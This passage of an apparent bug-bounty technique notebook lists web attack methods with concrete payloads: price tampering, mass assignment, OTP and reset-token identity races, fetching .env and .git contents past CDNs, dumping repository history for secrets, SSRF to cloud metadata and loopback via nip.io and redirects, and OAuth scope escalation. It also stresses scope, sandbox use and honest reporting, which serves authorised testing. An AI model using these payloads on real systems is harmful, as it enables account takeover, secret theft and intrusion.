quantity: 2147483648   # 32-bit wrap -> may land negative
shipping_fee: -50      # secondary field, usually unguarded
handling_fee: 0
currency: "<weak currency>"

# TWO-STEP CONVERSION: if the price is computed in one currency and
# converted at checkout, set the BASE currency to the weak one so the
# conversion becomes 1:1 - the amount stays, the unit changes.
# Then RELOAD the payment page; the recalculation is what applies it.
techniques.tell: A checkout or invoice body carrying more than one numeric field, or any UI that shows a computed subtotal. Also any flow where a price is quoted in one currency and settled in another.
techniques.verify: Verdict on the CHARGED amount, never the displayed one - refetch the order/invoice server-side after completing it. A response echoing your tampered value proves nothing; the order record does. On a live programme use the smallest deviation that proves the flaw (one unit, one cent) rather than the largest, and never complete a real-money transaction outside a sandbox: use the vendor's test cards.

techniques.technique: TWO ORACLES THAT TELL YOU A HIDDEN FIELD IS REAL BEFORE YOU TRY TO ABUSE IT. (1) DIFF THE READ AGAINST THE WRITE: GET the object and compare its fields to what the PATCH body sends. Fields present in the response but absent from the request are exactly the auto-bound candidates - id, isAdmin, role, balance, status, verified, ownerId. You are not guessing field names; the object hands them to you. (2) SEND AN INVALID VALUE FIRST: submit the candidate with a type or value the backend cannot accept (isAdmin as the string foo instead of true). If the response differs from the same request with a VALID value, the field reached the query logic and is being processed. If both are identical, it is being dropped and the field is dead.
techniques.payload:
GET   /api/users/123   -> {"id":123,"name":"x","email":"...","isAdmin":false}
PATCH /api/users/123      {"username":"x","email":"..."}
#                            ^ fields in the response you never sent

# oracle 2 - three requests, compare responses:
PATCH {...,"isAdmin":false}   # valid, matches current state
PATCH {...,"isAdmin":"foo"}   # INVALID type
PATCH {...,"isAdmin":true}    # the actual attempt

# different behaviour on the invalid one => the field is processed
# identical on all three         => it is stripped; stop here

# high-yield spots that are NOT the profile endpoint:
#   registration/signup (no prior session to check the role against)
#   the PENDING record in an invite flow
#   PATCH on your own freshly-created account: {"is_verified":true}
techniques.tell: Any JSON API on a framework with model auto-binding, and especially any endpoint whose response object is richer than its request body.
techniques.verify: Read the FIELD, not the status - refetch the object and confirm the value changed, then exercise the privilege it supposedly grants. Beware the reverse trap: a 200 on a write that sets a field to the value it already held is a no-op and may never consult authorisation at all, so always change the value to something different from current. Use inert probe fields where possible so an accepted write cannot damage the account.

techniques.technique: RACE THE IDENTITY IN A MULTI-STEP FLOW, NOT JUST THE COUNTER. Limit-bypass races are the familiar shape, but the higher-impact version races the SUBJECT of a flow rather than its count. Multi-step auth flows (request reset -> receive token -> submit token; init login -> send OTP -> verify OTP) frequently keep the in-progress identity in one mutable slot keyed by session. Start the flow as yourself, then change the identity to the victim before the final step: the token or OTP delivered to YOU gets validated against THEIR account. Same for single-use tokens - two parallel submissions of one token can both pass the not-yet-used check before either marks it used.
techniques.payload:
# A. reset-token rebind - same session, back to back
POST /reset_password  username=<attacker-address>        # token X emailed to me
POST /reset_password  username=<victim-address>  # slot overwritten, token kept
# then redeem token X -> sets the victim's password

# B. OTP identity swap - send the last two requests together
POST /login/init   {"email":"<attacker-address>"}        # OTP delivered to me
POST /login/email  {"email":"<victim-address>"}  # ] same
POST /login/verify {"otp":"<my code>"}            # ] moment

# C. single-use token, twice, in one packet
# send both submissions grouped so neither sees the other's write
techniques.tell: Any flow where an identifier (email, username, phone, account id) can still be changed AFTER a secret has been issued but BEFORE it is verified. The give-away is a separate init step that accepts the identifier and returns nothing sensitive.
techniques.verify: Use your own two accounts as attacker and victim - never a real user's address. Verdict on END STATE: did the victim account's password actually change, is the session you hold really theirs? Two 200s prove nothing on their own. Record how many attempts were needed and note that the result is timing-dependent; a race that fires 1 in 10 times is still a valid finding but say so plainly rather than implying determinism.

techniques.technique: SOURCE MAPS HAND YOU THE ORIGINAL SOURCE TREE, AND THEIR EXPOSURE IS ITSELF A FINDING. A minified bundle often ends with a sourceMappingURL comment naming main.<hash>.js.map. If that file is served, it reconstructs the developer-written code - real variable names, file structure, comments, TODO/FIXME notes, internal endpoints, and any secret that minification merely made ugly. This is the highest-yield single step in JS recon and it costs one request. Check it BEFORE grinding through minified code, because it may make the grinding unnecessary.
techniques.payload:
# does it exist? (also try /static/js/, /assets/js/, /build/static/js/)
curl -sI https://<host>/static/js/main.<hash>.js.map

# list the original source tree without any tooling
curl -s https://<host>/static/js/main.<hash>.js.map | jq '.sources[]'

# reconstruct it
sourcemapper -url https://<host>/js/app.js.map -output ./src/
grep -rniE 'sk_live|AKIA|client_secret|password|internal[.]|admin' ./src/

# a bundle with no .map still leaks: check the tail for sourceMappingURL,
# and try the same filename under a build/ or dev/ prefix
techniques.tell: Any hashed production bundle. Frameworks default source maps ON in development and teams forget to disable them for production builds (webpack devtool, vite build.sourcemap, next productionBrowserSourceMaps).
techniques.verify: Confirm the .map is served unauthenticated and actually parses - a 200 returning the SPA index.html is the catch-all, not a source map, so check the content type and that jq finds a sources array. Report the exposure itself only where the programme accepts it; otherwise treat it as recon and report what it REVEALS. If it yields a credential, apply the publishable-vs-confidential calibration before claiming anything, and stop at disclosure if the brief says not to probe scope.

techniques.technique: DIFF TODAY'S BUNDLE AGAINST AN ARCHIVED ONE - REMOVED FROM THE FRONTEND RARELY MEANS REMOVED FROM THE BACKEND. When a feature is deprecated the UI stops calling it, but the route usually survives on the server, often with the authorisation check that was written for a context nobody exercises any more. Historical JavaScript is a free, passive, zero-touch source of those routes: pull every JS URL the archive ever saw, subtract the ones still live, and read what only exists in the past.
techniques.payload:
# every JS URL ever crawled for the domain - touches the target ZERO times
curl -s 'https://web.archive.org/cdx/search/cdx?url=<domain>/*&output=text&fl=original&collapse=urlkey&filter=mimetype:application/javascript' > passive.txt

# live inventory (view-source, not DevTools: raw server output, no JS injection)
curl -s https://<host>/ | grep -oE '<script[^>]+src="[^"]+"' > live.txt

# what existed then and not now = highest priority
comm -23 <(sort passive.txt) <(sort live.txt) > historical_only.txt

# diff the endpoint sets, not the files
diff <(grep -oh '"/api/[^"]*"' current.js   | sort -u) \
     <(grep -oh '"/api/[^"]*"' archived_*.js | sort -u)
# lines only in the archive -> test each with an authenticated session
techniques.tell: Any target older than a couple of years, and especially one that has visibly redesigned or migrated an admin area. Also worth re-running on active programmes every few weeks - new bundles ship with new routes.
techniques.verify: A historical route that answers is not automatically a bug: confirm it still performs a real action, then test it for the authorisation the live routes have. Skip vendor libraries entirely when triaging (react, lodash, d3, monaco, reactflow) - they hold no app routes and reading them is procrastination. Record WHY each lead is a lead ('present only in Q3-2022 builds, suggests a decommissioned admin migration'), because that note is what tells you how to validate it later.

techniques.technique: WHEN THE EDGE BLOCKS A PATH, ASK THE ORIGIN DIRECTLY. A CDN, WAF or reverse proxy commonly carries the rule that denies dotfiles and config paths - and the origin behind it carries no such rule. If you can reach the origin hostname (a platform default domain, a CNAME target, a storage endpoint), the same request that 403s at the edge may be served in full. The protection was deployed at one layer and the other layer was never hardened.
techniques.payload:
# find the origin: CNAME chain, cert transparency, historical DNS
dig +short <host> CNAME
curl -s 'https://crt.sh/?q=%25.<domain>&output=json' | jq -r '.[].name_value' | sort -u

# same path, both layers - compare
curl -si https://<edge-host>/.env      # 403 at the edge
curl -si https://<origin-host>/.env    # may be 200

# also try: /.git/config  /.env.bak  /.env.local  /config.json
#           /application.yml  /credentials.json
# and the reverse case: a path that 404s at the edge but exists on the origin
techniques.tell: Any target whose response headers name a CDN while the application is clearly hosted elsewhere. A 403 on a dotfile is itself the tell - something bothered to write a rule, which means the file may well be there.
techniques.verify: Confirm the origin is IN SCOPE before sending it anything - a platform default hostname is frequently NOT in the programme's target list even though the application is, and testing it is then out of scope regardless of what it returns. Reading a hostname out of DNS is passive; sending it requests is not. If it is out of scope, report the edge/origin inconsistency against the in-scope host and let them look.

techniques.technique: AN EXPOSED .git DIRECTORY CONTAINS EVERY VERSION OF EVERY FILE, INCLUDING THE SECRETS SOMEONE 'REMOVED'. Deleting a credential from a file and committing the fix does not delete it - the old blob stays in history forever. If the .git directory is served, the whole history is downloadable, and the highest-value commits are precisely the ones whose messages say they are cleaning something up.
techniques.payload:
curl -sI https://<host>/.git/HEAD        # 200 or redirect = worth pursuing

git-dumper https://<host>/.git/ ./repo/

cd repo
git log --all -p | grep -niE 'password|secret|api[_-]?key|token|AKIA|sk_live'
git log --all --oneline | grep -iE 'remove|delete|rotate|clean|oops|revert'
git log --all --diff-filter=D --summary | grep delete   # deleted files

# same idea, no git: backup copies left beside the original
# config.php.bak  .env.old  wp-config.php~  settings.py.swp  index.php.save
techniques.tell: A 200 or 403 (rather than a clean 404) on /.git/HEAD or /.git/config. Older deployments, anything rsynced or FTP-uploaded rather than built by a pipeline.
techniques.verify: Confirm you have real object data, not the SPA catch-all - /.git/HEAD should return a ref line, not HTML. Treat anything you recover as live until proven otherwise: report the credential, and do not exercise it if the brief says to leave scope determination to them. Note honestly that a secret found in history may already be rotated; that is the programme's call to make, not a reason to withhold it.

techniques.technique: FOUR MISTAKES THAT TURN A REAL SECRET INTO A REJECTED REPORT - a negative-result checklist worth more than most findings. A researcher found a genuine RSA private key in a production bundle, forged JWTs with it, and still had the report closed. The key signed logging payloads rather than authentication; the endpoints tested were GUESSED rather than captured; the 200 responses carried error bodies that were read as acceptance; and the impact section argued theory instead of showing effect. Every one of those is avoidable before you press submit.
techniques.payload:
# BEFORE claiming a secret is exploitable, in this order:
# 1. CAPTURE, do not guess. Find where the value is USED in the bundle:
#      grep -oE '.{140}<VALUE_OR_VAR>.{200}' bundle.js
#    a value passed as client_secret / Authorization is a credential;
#    the same-looking string used to sign a log payload is not.
# 2. Drive the real feature in the browser and read the actual request.
#    An endpoint you invented answering 404 tells you nothing.
# 3. READ THE BODY, NOT THE STATUS:
#      curl -si ... | tail -20     # 200 {"error":"invalid_client"} is FAILURE
# 4. Show the effect. One screenshot of a state that could not exist
#    without the flaw beats three paragraphs of what an attacker could do.
techniques.tell: Fires whenever you are about to write the words 'an attacker could' without having done the thing. Also whenever a high-entropy string is assumed to be an auth credential purely because it looks random.
techniques.verify: State what you did and what you did NOT do, explicitly - it protects the report's credibility when a triager finds the gap themselves. Keep it short: length is read as noise, and some programmes explicitly delay or ban submissions padded with generated text. Calibrate the value first - publishable-by-design keys (pk_live_, RUM tokens, OAuth client IDs, subscribe keys, search keys, error-reporting DSNs) are not findings, while values named *_secret, sk_live_, server SDK keys, publish keys, vendor AUTH tokens carrying read/write scopes, and private keys are.

techniques.technique: MAP THE VALIDATOR'S BOUNDARIES INSTEAD OF GUESSING PAST IT, AND CHECK WHETHER THE LIMIT ITSELF IS CLIENT-SUPPLIED. When a field is rejected, the useful move is not a bigger payload - it is a short sweep that tells you exactly which rule fired and which fields have no rule at all. Then look one level up: forms and request bodies sometimes carry the CONSTRAINT alongside the value (max_allowed, limit, maxQuantity, allowedRoles). Changing the constraint is cheaper than defeating it, and it is often unguarded because the developer thinks of it as display metadata.
techniques.payload:
# sweep one field to find the actual rule
age=17 -> 403   age=18 -> 200   age=150 -> 403   age=0 -> 403   age=-1 -> 403
age="18" -> 200        # string accepted where int expected
age=18.0 / 018 / +18   # parser quirks
age=abc  -> 500        # a 500 is a finding of its own: unhandled type

# isolate WHICH field is validated - vary one, hold the rest clean
# then send the whole body with only the unvalidated field changed

# the limit as data:
<input type="hidden" name="max_allowed" value="100">
POST /withdraw  max_allowed=999999&withdraw_amount=999999

# type confusion on identifiers, which can skip a check entirely:
{"user_id":123} -> "123" / true / null / [123]
techniques.tell: Any hidden input or JSON field that describes a rule rather than a value, and any endpoint that rejects one field while silently accepting everything else in the same body.
techniques.verify: Do not report the sweep - report the one request that produced a state change, with a control showing the normal path refused. A 500 is not automatically a bug either: capture what it leaks (stack trace, internal enum, framework version) and judge it on that. Never send a value that would actually move money or destroy data just to map a boundary; probe with amounts that are inert if accepted.

techniques.technique: TEST CROSS-ENVIRONMENT SESSION ISOLATION, NOT JUST CROSS-TENANT. Every hunt tests whether tenant A's token reaches tenant B. Almost nobody tests whether a token minted in STAGING, SANDBOX, DEV or a demo environment is accepted by PRODUCTION. The two environments usually run the same code from the same repo, and that is precisely why the flaw appears: a shared signing key, a shared session store, a cookie scoped to the parent domain, or a validator that checks the token's signature and expiry but never which environment issued it. The impact is that a low-value account anyone can self-register in a sandbox becomes an authenticated identity against real customer data - a 0-click takeover with no victim interaction at all.
techniques.payload:
# 1. mint a session in the LOW-value environment (sandbox/staging/demo)
#    these usually allow open self-signup, which is the whole point

# 2. take that credential and replay a HARMLESS, READ-ONLY request against
#    production. Do NOT start with a write.
curl -si https://<prod-host>/v1/me          -H "$SANDBOX_AUTH_HEADER"       
curl -si https://<prod-host>/v1/me          -b "$SANDBOX_COOKIE"            

# 3. read the DIFFERENCE, because both refusals are not the same refusal:
#    401 invalid/unknown token   -> isolated, and the class closes here
#    401 expired / wrong-audience-> the token PARSED; the check is narrow
#    403 authenticated-but-denied-> IT AUTHENTICATED YOU. finding.
#    200                          -> full cross-environment session acceptance

# 4. cookie-scope variant - check the Domain attribute on the sandbox cookie:
#    Domain=.example.com  (parent)  -> one jar spans both hosts; the browser
#                                      will send it to prod without any replay
#    Domain=sandbox.example.com     -> scoped, and this variant is dead

# also worth one request each, same idea, different pair:
#   docs/marketing host -> app host      preview/branch deploy -> prod
#   regional shard      -> another shard  old API version -> current
techniques.tell: Any target that publishes a second environment you can sign up for freely - a host prefixed sandbox-/staging-/dev-/demo-, a *.preview or *.vercel.app style branch deploy, or a documented test mode. A programme that advertises 'the sandbox runs the same code as production' is stating the precondition out loud.
techniques.verify: Order matters and so does restraint. Establish the CONTROL first: the same production request with NO credential, so you know what an unauthenticated refusal looks like on that endpoint - without it a 401 tells you nothing. Then judge on the error string, not the status code, because 'invalid token' and 'expired token' are different findings. Keep every probe READ-ONLY on the production side: many programmes forbid financial or state-changing tests against production even when the sandbox is fair game, and a cross-environment write is exactly the action that turns research into an incident. If it authenticates, stop there and report - you do not need to enumerate what it reaches to prove the boundary is missing.

techniques.technique: WHEN THE BRIEF AND THE TRIAGER WANT OPPOSITE THINGS, RESOLVE IT BEFORE YOU FILE. Some programmes tell you to STOP at discovery: 'if you find a credential, report it - we will determine its scope, do not probe it yourself.' Platform triagers apply a different standard: 'a submission must demonstrate impact.' Obey the brief and the report reads as theoretical; obey the triager and you violate the brief. The contradiction is invisible until the report comes back Not Applicable, and by then it has already been spent. It exists because the brief is written by the vendor's security team and the first reviewer is often the PLATFORM, who applies platform norms and may never see the clause you followed.
techniques.payload:
# BEFORE submitting a stop-at-discovery finding, do all three:

# 1. QUOTE THE CLAUSE IN THE SUBMISSION ITSELF, verbatim, and say you are following it.
#    A triager who never reads the brief will at least read your report.
#      "Per the brief: 'we will determine the scope of access; do not attempt to
#       discover the scope yourself.' I have therefore not exercised the credential."

# 2. FIND THE MAXIMUM PROOF THAT DOES NOT EXERCISE THE FINDING, and show it:
#      - the value is served with NO cookie and NO Authorization header (curl -si)
#      - the vendor's OWN code consumes it in a security-relevant position
#        (grep the bundle: clientSecret: X ... append('client_secret', X))
#      - the file/route is reachable in N requests from an unauthenticated start
#    Mechanism proof is not impact proof, but it is the ceiling the brief allows.

# 3. OFFER THE NEXT STEP EXPLICITLY:
#      "If a demonstration of validity is required, I will perform a minimal
#       non-invasive check on request - I did not do so unprompted because the
#       brief asked researchers not to."
#    This converts 'no PoC' into 'a PoC you must authorise', which is a different
#    conversation and often gets escalated to the vendor instead of auto-closed.
techniques.tell: Fires on any brief containing a stop-at-discovery instruction: credential reporting, 'do not pivot', 'stop and report if you reach a server', 'do not access customer data'. Also fires whenever you are about to write 'I am not asserting what this grants' - that sentence is honest, but a triager cannot distinguish honesty-about-limits from absence-of-a-proof-of-concept.
techniques.verify: Judge your own report the way a triager will: strip out every sentence about what you did NOT do, and ask whether what remains demonstrates something. If the remainder is only 'this value is exposed', expect Not Applicable regardless of how correct you are. Appeal ONCE if the brief genuinely supports you - quote the clause, restate the reproduction as commands rather than prose, and offer the authorised next step. Then accept the outcome; re-litigating a triage decision costs standing with a programme worth more than one report. And record the loss honestly in the scoreboard - a Not Applicable is a result about your METHOD, not merely about the target.

techniques.technique: destination allowlists that reject literal internal IPs at CREATE are usually string matchers with no DNS resolution: resubmit the same address as a resolving hostname (169-254-169-254.nip.io, localtest.me, 127-0-0-1.nip.io). Creation acceptance is NOT the finding - prove the dial by firing the vendor's own /test endpoint and reading the delivery attempt error STRING and DURATION against a control host that can never resolve
techniques.payload: create: https://169.254.169.254/ -> 400 | https://169-254-169-254.nip.io/ -> 201 | POST /{id}/test | GET /{id}/deliveries
techniques.tell: NXDOMAIN control fails in ~6ms with 'dial tcp: lookup X on <resolver>: no such host'; the bypass host burns the full client timeout (5000ms) with 'context deadline exceeded ... while awaiting headers' => resolved + packet sent + no destination policy at delivery time. Identical errors across both = no separation, no proof

techniques.technique: read webhook/job delivery error strings in full - Go net/http surfaces the internal resolver address and VPC topology inside the failure message, and the attempt duration is a side channel separating DNS failure from TCP drop from refusal
techniques.payload: GET /api/<resource>/{id}/deliveries -> attempts[].error_message + attempts[].duration
techniques.tell: 'dial tcp: lookup host on <rfc1918-resolver>:53: no such host' leaks the RFC1918 resolver IP and proves the fetcher runs inside a private subnet; egress source IP + User-Agent (Go-http-client/2.0) come free from your own listener

techniques.technique: an async action that returns 202 pending is not evidence of anything - find the delivery/attempt log before running the ladder, and confirm the log records your KNOWN-GOOD control first. A metrics/stats endpoint can read all-zero while deliveries are actually happening
techniques.payload: probe /{id}/events /{id}/deliveries /{id}/attempts /{id}/stats - keep whichever returns rows
techniques.tell: stats showed successful_deliveries=0 and failed_deliveries=0 while /deliveries held the real failed attempts and the external listener logged a real POST; wrong oracle = false ENFORCED verdict

techniques.technique: a create-time URL validator cannot protect a fetcher that follows redirects - store an ordinary public HTTPS endpoint that passes every check, then 3xx it to the real destination at delivery time. Test BOTH 302 and 307: Go's http.Client downgrades 302 to GET but preserves POST and body on 307, so 307 lands a full attacker-shaped POST on the internal host
techniques.payload: listener /r302 -> 302 Location: /landed | /r307 -> 307 Location: /landed | /r302-loop -> 302 Location: http://127.0.0.1/x  then create a stream per path, fire the vendor test, watch YOUR log for the second hit
techniques.tell: two hits ~40ms apart in your own log, second one on the redirect target = it follows. Method on hit 2 tells you which: GET after 302, POST after 307. A redirect target with a different SCHEME also probes whether an https-only rule survives the hop. Target-specific and NOT guessable - one target followed, another treated every 3xx as an unstructured delivery failure

techniques.technique: a timeout argues, an RST does not - pick a blind-SSRF target that will ACTIVELY REFUSE. Loopback on a closed port returns 'connect: connection refused' in tens of ms, which is a completed TCP round trip (SYN out, RST back) and proves the fetcher reached the network layer. A link-local timeout only proves a packet left
techniques.payload: aim at 127.0.0.1:80 / [::1]:443 via BOTH routes - a DNS hostname (localtest.me) and a 3xx redirect - then compare attempts[].error_message and duration against an NXDOMAIN control
techniques.tell: four separable outcomes: NXDOMAIN ~6ms 'no such host' | firewalled 5000ms 'context deadline exceeded' | REFUSED ~33ms 'connect: connection refused' | delivered 200. Two independent paths landing on refused = no network-level destination restriction. Still no response body read, so report the missing control, never 'accessed an internal service'

techniques.technique: a scheme constraint enforced at CREATE dies at the first redirect - if the schema rejects http:// but the fetcher follows 3xx, point the redirect at http://127.0.0.1:80 and the plaintext hop happens anyway. Same hop also defeats port constraints
techniques.payload: create with https:// (passes), redirect to http://127.0.0.1/x, read the attempt error for ':80'
techniques.tell: error names 'dial tcp 127.0.0.1:80' after a create that only accepted https => scheme+port validated once, at the wrong layer. Also watch the resolved family: a hostname can return AAAA and Go will prefer [::1], so an IPv4-literal blocklist never fires

techniques.technique: build the PoC so each half of the chain is logged by a DIFFERENT party - your listener records their agent arriving and the response you handed it, their own delivery log records what that response made them do. The vendor can then confirm the finding from their own telemetry without trusting any artifact you produced
techniques.payload: listener log: inbound request + source IP + User-Agent + the 3xx you returned || vendor log: the resulting connection attempt and its error. Quote both timestamps so the two halves pair
techniques.tell: a report resting only on researcher screenshots invites 'cannot reproduce'; a report where the vendor holds half the evidence does not. Also harvest the egress source IPs - more than one usually appears, showing a NAT pool, and each is a correlation handle triage can grep for GOLD: the agent's request usually carries the VENDOR'S OWN correlation id (x-request-id / x-amzn-trace-id / traceparent) - capture it off your listener and quote it as plain text in the report. Triage can grep their internal logs for that exact id and land on the precise event, verifying in seconds without reproducing anything. Quote the timestamp and egress IP alongside it.

techniques.technique: before any cross-tenant sweep, PRINT THE FOREIGN IDS NEXT TO THE OWN IDS AND ASSERT THEY DIFFER. If the collector ran in the wrong tenant they are identical, every endpoint returns 200, and the run reads as a total cross-tenant breach when it is an object compared with itself
techniques.payload: assert own[k] !== foreign[k] for every object type, and abort the batch if any pair matches. Derive the tenant from a value the SERVER echoes (resource-server identifier, object.tenant field, the dashboard URL path), never from a settings blob you hope contains a name
techniques.tell: the tell is in the response body: every object carries the SAME tenant field, and own/foreign bodies are byte-identical. A second account that is a low-ROLE MEMBER of your own tenant is not a second TENANT - role 403s on users/logs/streams look like a tenant boundary and are not one

techniques.technique: the token endpoint's audience errors sort into TWO vocabularies - 'service not enabled within domain' (no such resource server here) versus 'client is not authorized to access resource server' (exists, not granted). Establish both buckets with known inputs, then check which bucket a FOREIGN tenant's audience falls into
techniques.payload: client_credentials with audience = own RS (200) | nonexistent RS in own tenant | a foreign tenant's /api/v2/ | a real-but-ungranted RS such as /userinfo
techniques.tell: foreign tenant landing in the does-not-exist bucket = no cross-tenant existence oracle. Landing in the exists-but-denied bucket = you can enumerate other tenants' resource servers. The real-but-ungranted probe is what proves the two buckets differ at all - without it, matching strings prove nothing

techniques.technique: scope escalation on client_credentials: grant the client exactly ONE scope, then request supersets. Decode the returned JWT's own scope claim - never trust the response envelope. Also request NO scope: a correct server returns the granted set, a broken one returns everything the resource server defines
techniques.payload: grant scope=[read:clients], then request: read:clients (control) | omitted | read+update+create+delete | read:users read:logs | read:signing_keys read:client_keys
techniques.tell: a 403 that ENUMERATES the ungranted scopes is an ACL oracle - the tenant's whole scope model is enumerable one request at a time. PRE-FLIGHT: the client must have the grant_type enabled or every row is access_denied for a reason that has nothing to do with scope, and assert the client_secret length before sending - a secret clipped by one character produces the same 401 as a real denial

techniques.technique: a route table built from HAR ENTRIES is what the browser called; the BUNDLE BODIES are what exists. Grep every JS asset in the capture for quoted path literals and diff against the observed set - the gap is the unexercised surface. Then establish an ABSENT baseline (a path you invented) before judging any 404
techniques.payload: regex the js blob for quoted /api/ /oauth/ /oidc/ literals + template-string variants, normalise ${...} and /:param to {v}, subtract the observed paths, then GET and POST each survivor alongside an invented control path
techniques.tell: an empty-body 404 that MATCHES the invented control = route absent (usually a shared vendor bundle referencing another deployment). A 404 or 400 with a DIFFERENT body = live route, often POST-only or served by a different router - that error vocabulary is the tell. GET 404 alone never retires an endpoint

techniques.technique: when a schema error is INVARIANT across every payload shape - including a correct one - the validator's field-path renderer is broken, not your input. Stop varying the value and brute the WRAPPER KEY instead; the message stays identical until the key is right, then the status changes
techniques.payload: send {}, [], [{}], [{a:1}] - if all return the same message, try {modules:[...]}, {items:[...]}, {packages:[...]}, {dependencies:[...]} until one returns a different status
techniques.tell: a path rendered as '.function join() { [native code] }' means the server did path.join without calling it. Other validation branches on the SAME endpoint may render the path correctly ('.modules'), which confirms the endpoint is healthy and only one branch is broken - do not write the endpoint off as non-functional the way a genuinely broken one should be

techniques.technique: a strict format gate on ONE field can close a whole vulnerability class structurally - check the gate before building the exploit rig. A package installer that requires an exact pinned semver cannot accept npm:, https://tarball, git+https:// or file: syntax, so the fetch-from-attacker-host vector dies at parse time and no listener probe is needed
techniques.payload: probe the format gate first: send the exact valid form (control), then each alternative syntax the underlying tool would normally accept, and read which layer rejects
techniques.tell: if every alternate syntax fails with the SAME format error as a nonsense value, the gate is structural rather than a blocklist. Say so plainly and do not run the outbound probe - an unrun probe on a closed vector is a clean verdict, not a coverage gap

techniques.technique: before probing neighbours of an object id, DECOMPOSE the id. If it encodes several correlated fields (timestamp + counter + shard), incrementing one segment while holding the others produces an id that exists for NOBODY - the 404s are malformedness, not authorization, and reading them as ENFORCED is a false verdict
techniques.payload: list several of your own ids and diff them column by column to find which segments co-vary. If two segments move together per record, you cannot synthesise a valid foreign id at all - the only source is sampling a tenant you control
techniques.tell: the giveaway is that the id one BELOW your own also 404s even though that record demonstrably exists in your own listing - proof the segments must agree. When synthesis is impossible, the honest verdict is UNTESTED-blocked, never enforced

techniques.technique: the vendor's DASHBOARD API is usually a superset of their DOCUMENTED public API - diff the two field lists and probe what only the dashboard accepts. A value the public docs say can only be ROTATED through a dedicated endpoint may be directly settable to an attacker-chosen value on the console API
techniques.payload: for each object, list the documented PATCH fields, then PATCH the dashboard endpoint with fields the docs omit (credential fields, ownership fields, type/tier fields). Diff object state before and after, never the status
techniques.tell: a 200 with NO state change means the schema accepted the field and the server discarded it - indistinguishable from a real write on status alone. Owner-only superset fields are an observation, not a finding; they become a finding only when a LOWER role can write them, so re-run the same battery as the least-privileged role and include a legitimate-field control write to tell field-denial from endpoint-denial

techniques.technique: DUPE-CHECK BEFORE FILING - but first check the mechanism matches YOUR VENUE. HackerOne's public GraphQL hacktivity is unauthenticated and queryable by programme handle + title keyword, which is useful ONLY if you file on HackerOne. For Bugcrowd or YesWeHack the equivalent is that platform's own disclosed-submission listing, and whether it is queryable at all is unverified
techniques.payload: POST https://hackerone.com/graphql  {"query":"{hacktivity_items(first:10,order_by:{field:popular,direction:DESC},where:{team:{handle:{_eq:\"<handle>\"}},report:{title:{_icontains:\"<keyword>\"}}}){nodes{... on HacktivityDocument{report{title severity_rating disclosed_at url state}}}}}"}
techniques.tell: ⚠️ MEASURED LIMIT, 2026-08-25: our venue mix is 4 YWH + 4 Bugcrowd + ZERO HackerOne, so this exact query would have caught NONE of our 3 duplicates. The claim 'high value because 3-of-8 duplicate' was asserted from a general statistic without checking the mechanism applied - argue from the general to the specific and you skip the control. WORSE: the duplicate that hurt most merged into a report never publicly disclosed. Public-disclosure checking cannot see private prior art, which on a mature programme is most of the risk. A hit still KILLS decisively; a miss proves nothing at all

techniques.technique: gate an access-control finding on THREE identity proofs before it counts: session A read session B's data (not your own), reproduced on a FRESH session (not the existing logged-in cookie), and a confirmed anonymous-vs-authenticated delta. Any one missing = the finding is not proven
techniques.payload: assert own_id != foreign_id | replay in a clean profile with a new login | run the same request unauthenticated and confirm it is blocked
techniques.tell: the most common cause of an IDOR/ATO being closed N/A is the tester only ever read their own data. Field-proven the hard way: a sweep returned 200 on every endpoint because the collector had run in the same tenant, so own and foreign ids were the same objects

techniques.technique: make 'no proof' a STRUCTURAL fail, not a judgement call: before filing, paste the exact curl that reproduces the finding. Blank or 'skip' is an automatic reject. Separately, treat 'reached the endpoint but never saw victim data' as a DOWNGRADE rather than a kill
techniques.payload: require a literal reproducing command as a field in your own pre-filing checklist; if you cannot write it, you do not have a finding yet
techniques.tell: a yes/no 'do you have proof' question always passes - a required verbatim command does not. The downgrade branch is what separates a report filed at an honest tier from one closed informative for describing impact instead of showing it

techniques.technique: HUNT THE FEATURE, NOT THE ENDPOINT. Before probing, reconstruct why the developer built it this way: what was the simplest implementation, what shortcut would a tired dev take, where is auth actually checked (controller / middleware / DB layer), and what happens if you call endpoint B without going through endpoint A first. Then map the trust boundary - where does the app STOP trusting input, and where does it ASSUME input was already validated upstream
techniques.payload: per feature, not per URL: list every endpoint serving it, then test the INTERACTION between them. Pair with a business-logic vocabulary to name the hypothesis: price / quantity / workflow-state / coupon-redemption / referral / quota / entitlement / refund
techniques.tell: this is the generator our invariant lens lacks - the lens asks what a field assumes, this asks WHY the code assumes it. The named vocabulary matters because a hypothesis phrased as 'check-and-consume must be atomic' or 'a merchant-fixed property must stay immutable' points at a technique, while 'try mass assignment' points at nothing

techniques.technique: INVARIANT NEIGHBOURHOOD SWEEP - the moment one trust assumption fails, the same mistake is most likely in code written by the same hand: sibling endpoints in the same controller, the other verbs on the same path, the same backend helper, the same state machine, the same field owner. Confirm A, map siblings, test siblings, and only claim a chain that is actually proven
techniques.payload: found IDOR on GET -> try PUT/DELETE on the same path | found an auth bypass -> every sibling endpoint in that controller | found stored XSS -> does an admin view render it | found SSRF -> what does the same fetcher reach elsewhere
techniques.tell: STOP RULE, and it is the part most people skip: if 3 sibling candidates come back clean the cluster is dry - move on rather than grinding. This is the highest-value move immediately AFTER a confirmed finding, which is exactly when attention usually shifts to report writing

techniques.technique: TURN EVERY KILLED FALSE POSITIVE INTO A REGRESSION FIXTURE. Each time a control kills a candidate, write the shape down as a named case; any future change to method or tooling must still kill all of them
techniques.payload: fixture set to maintain: own-object-only (compared an id against itself) | DNS-callback-only | self-XSS | cosmetic 200 with no state change | publishable-by-design public key | stored-but-encoded-at-render | no-op write that never triggers authz
techniques.tell: an FP that is only remembered gets re-made - twice in one session I re-shipped an identity guard I had already flagged as weak. A named fixture list is checkable; intention is not

techniques.technique: DIFFS FIND BUGS - two implementations of one contract rarely enforce it identically. Compare mobile API vs web API, v1 vs v2 of the same route, free-tier vs paid response, documented API vs the console/dashboard API, pre- vs post-upgrade behaviour
techniques.payload: same logical operation through both paths, diff the accepted fields and the enforced checks. A fix applied to /v2/ and missed on /v1/ is the classic; a dashboard API accepting fields the public docs never mention is the same shape
techniques.tell: differential behaviour exposes a broken contract without needing to guess the invariant - one side shows you what the rule is SUPPOSED to be. Field-proven: a console API accepted a credential field that the documented API only exposes through a dedicated rotate endpoint

techniques.technique: probe BOTH metadata documents, not just one: /.well-known/openid-configuration AND /.well-known/oauth-authorization-server. They are different files and a server may expose endpoints in one that the other omits. Read token_endpoint_auth_methods_supported - a value of none means the token endpoint accepts an exchange with NO client secret
techniques.payload: GET /.well-known/oauth-authorization-server | GET /.well-known/openid-configuration | diff registration_endpoint, grant_types_supported, token_endpoint_auth_methods_supported, code_challenge_methods_supported
